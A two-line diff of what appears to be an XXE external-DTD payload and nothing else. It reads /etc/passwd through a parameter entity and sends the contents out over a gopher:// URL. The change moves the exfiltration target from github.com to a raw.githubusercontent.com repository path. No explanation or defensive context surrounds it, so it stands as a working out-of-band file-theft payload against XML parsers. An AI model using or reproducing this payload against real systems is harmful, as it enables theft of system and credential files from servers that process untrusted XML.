@@ -1,2 +1,2 @@
 <!ENTITY % a SYSTEM "file:///etc/passwd"> 
-<!ENTITY % b "<!ENTITY &#37; c SYSTEM 'gopher://github.com/%a;'>"> %b; %c
+<!ENTITY % b "<!ENTITY &#37; c SYSTEM 'gopher://raw.githubusercontent.com/caonima-png/1/master/%a;'>"> %b; %c
